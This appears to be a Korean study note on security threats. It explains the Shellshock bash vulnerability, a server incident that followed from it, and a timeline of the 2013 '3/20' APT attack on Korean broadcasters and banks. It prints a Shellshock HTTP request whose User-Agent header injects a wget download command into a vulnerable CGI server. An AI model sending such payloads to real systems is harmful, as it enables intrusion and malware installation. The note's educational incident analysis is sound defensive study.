# 보안 위협 정보 수집

## 보안 위협 이해

### 애플리케이션 취약점

2014년에 발생할 셸 쇼크(CVE-2014-6271, CVE-2014-7169) 취약점에 대해 알아보자.

2014년 9월 사용된 공격 방식은 bash 환경 변수로 저장되는 헤더 항목에 공격 구문을 삽입해 취약한 시스템을 공격하는 방식이었다.

```bash
telnet [ip] 80
GET /cgi-bin/test-cgi
...
User-Agent: (){:;}; wget -O /tmp/tmp # wget 명령을 이용해 다운로드한 파일을 tmp 디렉터리에 tmp 파일명으로 저장한다
```

대부분의 해킹 공격은 취약한 시스템을 공격하는 걸로 끝나지 않고, 자동화된 공격을 통해 취약한 시스템 접근을 확보한 후에 경유 시스템으로 많이 사용된다.

사례를 살펴보면

* 11/4: IDC 서버 이상 발견
  11/3 12:00부터 외부로 불생된 SSH 사전식 대응 공격 확인

* 11/4: 원인 분석 수행(침해사고 분석)
  BashShell 취약점 공격 확인
  악성코드 유입: http:// ... /bbs/skin/zero_vote/cpan_root

* 분석 결과 요약
  11/01: Bash shell 취약점 공격, 악성코드 설치
  11/03: 외부로 SSH 무작위 사전식 대입 공격
  11/04: 사고 인지 후 시스템 분석

많은 경우 관리 허점을 이용하며, 아직도 2006년 발표된 제로보드 취약점이 사용되고 있다.

### 지능형 지속 공격

2013년 3월 20일 국내 언론사 몇 곳의 업무 관련 시스템들이 동시 다발적으로 파괴되는 사태가 발생핬다. 이로 인해 실제로 방송이 중단되기도 했다.

* 2010년 이후 발생된 주요 사이버 공격 사례

  11/3/4 : 청와대, 금융 기관, 네이버 대상 DDoS 공격
  11/4/12 : 농협 전산망 마비
  13/3/20 : 주요 언론사 및 금융기관 전산망 동시 장애
  13/6/25 : 청와대 홈페이지 변조, 언론사 및 정부 전산센터 공격
  14/12/15 : 한국수자력발전 내부 정보 유출 공개

지능형 지속 공격은 처음 공격에서 최종 목표를 실행하기까지 최소 6개월 이상 관리자나 사용자 몰래 활동한다.

2015년 미국의 FBI 수배자 명단에 중국의 61398 부대 장교가 올라간 사건이 있었다. 이 장교들의 실명과 부대 명칭은 외국계 보안 업체를 통해 실체가 밝혀지기 시작했고 MANDIANT APT 1 보고서를 통해 APT 기법을 사용하는 해커 그룹의 특징과 실체를 구체적으로 밝혀냈다.

3/20 사태로 돌아가자. 공격 당시 공격자는 이미 확보했던 정보를 이용해 자동화된 스크립트 형태로 시스템 파괴 명령을 자동으로 실행시켰다. 방화벽 로그와 침해 시스템의 시스템 로그, 침입탐지 시스템 로그 등 사건에 연관된 모든 보안 로그를 분석했고, 일련의 추적을 통해 공격자의 타임 테이블을 구성했다.

공격 특징은 사용자 대역, 사무실 대역에 대한 악성코드 감염 / 감염된 내부 시스템을 경유해 서버 하드 디스크 파괴이다.

타임 테이블은

* 사전 준비
  웹쉘 업로드(2012/03/22, 2012/06/20) : 공격 대상 서버에 웹쉘 업로드, 파일 탈취 및 SSH 통신
  애플리케이션 공격(2012/9/4) : PHP 취약점을 이용한 원격 명령 실행
* 성공
  정보 유출(2012/10/13) : 공격 대상 서버에 웹쉘 업로드, 소스 압축 후 유출
  악성코드 배포(2012/10/18) : 공격 대상 서버에 악성코드 유포 링크 삽입
  악성코드 감염(2013/02/08) : 이미지 파일(bd.gif)를 이용해 악성코드 설치
  원격 접근(2013/03/03 00:54:21) : 데이터센터(IDC) 서버 접근
* 확산
  원격 접근 : (03/19 AM 2~4) 단일 소스 IP에서 다수 3389, AM 4~5 다수 SSH
  악성코드 감염 : (03/20 03:53:30) crw.exe 파일 동시 감염(10대 이상)
* 파괴
  2013/03/20 14시 전후 시스템 OS 부팅 영역 손상

공격자는 수년 전부터 다양한 방면으로 공격을 시도했다. 서버를 대상으로 App 취약점윌 이용해 반복적으로 웹쉘 설치 시도, 이후 내부 시스템에 대한 정보(네트워크, App, 사용자 접속 정보)를 꾸준히 수집했다.
때로 웹 서버에 악성코드를 삽입해 일반 사용자 및 내부 사용자에게 악성코드를 감염시키기도 했다.
공격받은 시스템의 복구/차단 과정을 반복적으로 관찰해 가장 효율적인(짧은 시간에 가장 많은 경로로 접근 가능한) 경로를 파악했다.
13/3월 사용자들이 많은 사무실 PC에 대해 공격을 시도해 시스템 관리자 PC가 악성코드에 감염됬고, 관리자 시스템에서 서버 접근 정보(IP, ID, PW)를 수집해 공격을 감행했다.
